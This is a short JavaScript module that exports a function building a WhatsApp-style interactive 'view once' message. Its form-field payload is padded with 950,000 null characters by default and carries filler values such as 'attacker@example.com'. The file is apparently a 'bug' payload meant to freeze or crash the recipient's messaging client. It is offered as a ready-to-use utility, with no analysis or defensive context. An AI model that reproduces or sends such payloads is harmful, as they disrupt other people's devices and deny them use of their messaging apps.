// utils/bugv3Payload.js
exports.bugv3 = (size = 950000) => ({
  viewOnceMessage: {
    message: {
      interactiveResponseMessage: {
        body: {
          text: ' ',
          format: 'EXTENSIONS_1'
        },
        nativeFlowResponseMessage: {
          name: 'galaxy_message',
          paramsJson: JSON.stringify({
            screen_0_TextInput_0: `radio - buttons${"\u0000".repeat(size)}`,
            screen_0_TextInput_1: '\u0003',
            screen_0_Dropdown_2: '001-Grimgar',
            screen_0_RadioButtonsGroup_3: '0_true',
            screen_1_Dropdown_0: 'TrashDex Superior',
            screen_1_DatePicker_1: '1028995200000',
            screen_1_TextInput_2: 'attacker@example.com',
            screen_1_TextInput_3: '94643116',
            screen_2_OptIn_0: true,
            screen_2_OptIn_1: true,
            flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s.'
          }),
          version: 3
        }
      }
    }
  }
});
